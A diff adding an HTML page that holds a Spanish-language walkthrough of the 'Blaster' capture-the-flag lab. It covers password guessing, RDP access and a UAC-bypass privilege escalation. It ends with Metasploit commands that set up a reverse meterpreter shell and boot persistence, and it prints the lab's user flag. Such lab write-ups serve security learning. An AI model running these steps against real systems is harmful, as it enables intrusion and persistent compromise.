@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Blaster - Writeup Log4Nico</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #00060e;
+      color: #e6e6e6;
+      font-family: serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 2rem auto;
+      background: #292e39;
+      border-radius: 10px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.18);
+      padding: 2rem 2.5rem;
+    }
+    h1 {
+        color: limegreen;
+    }
+    h2, h3 {
+      color: #70e1f5;
+      margin-top: 1.5em;
+    }
+    pre, code {
+      background: #181c22;
+      color: #d1d1d1;
+      border-radius: 4px;
+      padding: 0.5em;
+      font-family: serif;
+    }
+    blockquote {
+      border-left: 4px solid #70e1f5;
+      background: #23272f;
+      margin: 1em 0;
+      padding: 0.7em 1em;
+      color: #b0b8c1;
+      font-style: italic;
+    }
+    img {
+      max-width: 100%;
+      border-radius: 6px;
+      margin: 1em 0;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.12);
+    }
+    ul, ol {
+      margin-left: 2em;
+    }
+    .flag {
+      display: inline-block;
+      background: #181c22;
+      color: #70e1f5;
+      border-radius: 4px;
+      padding: 0.2em 0.7em;
+      font-weight: bold;
+      margin: 0.2em 0;
+    }
+    .section {
+      margin-bottom: 2em;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Blaster</h1>
+    <p>Esta máquina es la última de la trilogía: Blue, Ice &amp; Blaster, lo que significa que está hecha por la misma persona y que nos guían bastante por todo el desarrollo de esta.</p>
+
+    <div class="section">
+      <h2>Análisis</h2>
+      <p>Empecemos con un escaneo de puertos, parece que la máquina está bloqueando los <em>ping</em>, probamos con el parámetro <code>-Pn</code>:</p>
+      <img src="img/image.png" alt="Escaneo de puertos">
+
+      <p>Encontramos un servicio web en el puerto 80 (Microsoft IIS httpd 10.0), y lo que parece una terminal remota (?) en el puerto 3389.</p>
+
+      <p>Empecemos por el más fácil, el servicio web:</p>
+      <img src="img/image-1.png" alt="Servicio web">
+
+      <p>Fuzzeamos la página:</p>
+      <img src="img/image-2.png" alt="Fuzzing">
+      <blockquote>Va para largo</blockquote>
+
+      <p>Encontramos 2 directorios, que son los mismos: /retro<br>
+      En este directorio encontramos varias entradas de una misma persona <strong>Wade</strong>, un posible usuario del sistema.<br>
+      Además de un comentario <em>curioso</em>:</p>
+
+      <img src="img/image-3.png" alt="Comentario curioso">
+      <blockquote>
+        Dice que van a hacer una peli de su libro favorito, que se llama igual que el prota de esa peli, y que se sigue equivocando al escribir el avatar al logearse.<br>
+        Podemos deducir, que el nombre del avatar es la contraseña de <strong>Wade</strong>:
+      </blockquote>
+      <img src="img/image-4.png" alt="Credenciales Wade">
+
+      <p>Vamos a intentar iniciar sesión con estas credenciales a través de la terminal remota RDP:</p>
+      <img src="img/image-5.png" alt="RDP login">
+      <img src="img/image-6.png" alt="RDP login éxito">
+
+      <p>Ya estaríamos dentro del servidor, y encontramos la primera <em>flag</em>, <strong>user.txt</strong>.</p>
+      <blockquote class="flag">THM{HACK_PLAYER_ONE}</blockquote>
+
+      <p>Vale, ahora que somos Wade, toca escalar privilegios.<br>
+      Encontramos este historial de búsquedas en el navegador:</p>
+      <img src="img/image-7.png" alt="Historial navegador">
+      <img src="img/image-8.png" alt="Historial navegador 2">
+
+      <p>Esta escalada de privilegios es un poco absurda, por lo fácil que es.</p>
+      <ol>
+        <li>Tenemos que ejecutar un archivo que esté protegido por contraseña (administrador):<br>
+          <img src="img/image-9.png" alt="Archivo protegido">
+        </li>
+        <li>Seguimos los siguientes pasos:<br>
+          <img src="img/image-10.png" alt="Paso 1">
+          <img src="img/image-11.png" alt="Paso 2">
+          <img src="img/image-12.png" alt="Paso 3">
+        </li>
+        <li>Esto nos abrirá el internet explorer, pero nunca cargará. En este momento tenemos que guardar la página con <code>Ctrl+S</code></li>
+        <li>Nos saldrá un error, lo quitamos y en la barra del explorador ponemos <code>cmd</code>:<br>
+          <img src="img/image-13.png" alt="Abrir cmd">
+        </li>
+        <li>Esto nos abrirá una terminal con permisos de administrador:<br>
+          <img src="img/image-14.png" alt="cmd admin">
+          <img src="img/image-16.png" alt="cmd admin 2">
+        </li>
+      </ol>
+      <img src="img/image-15.png" alt="Segunda flag">
+      <p>Segunda flag.</p>
+
+      <p>Ya habríamos terminado, pero también podemos hacer la máquina usando metasploit. Iniciamos metasploit y usamos el siguiente <code>exploit</code>:</p>
+      <pre><code>exploit/multi/script/web_delivery</code></pre>
+
+      <p>Primero, tenemos que cambiar el target. De primeras está en python, lo tenemos que cambiar a PSH, que tiene el id 2:</p>
+      <img src="img/image-17.png" alt="Metasploit target">
+
+      <p>Ponemos el lhost correcto:</p>
+      <pre><code>set lhost tun0</code></pre>
+
+      <p>El puerto lo podemos dejar por defecto, y THM nos dice que usemos el payload:</p>
+      <pre><code>set payload windows/meterpreter/reverse_http</code></pre>
+
+      <p>Iniciamos el exploit con <code>run</code>, y esto nos devuelve un comando de powershell, que tenemos que poner en el servidor, o sea, todo esto sirve para escalar privilegios, no para entrar en la máquina.</p>
+      <img src="img/image-18.png" alt="Powershell exploit">
+      <img src="img/image-19.png" alt="Meterpreter session">
+
+      <p>Se crea una nueva sesión, y si ponemos:</p>
+      <pre><code>sessions 1</code></pre>
+      <img src="img/image-20.png" alt="Meterpreter sesión">
+
+      <p>Por último, para ganar persistencia y que el meterpreter inicie cada vez que inicie la máquina, tenemos que poner el siguiente comando:</p>
+      <pre><code>run persistence -X</code></pre>
+    </div>
+  </div>
+</body>
+</html>
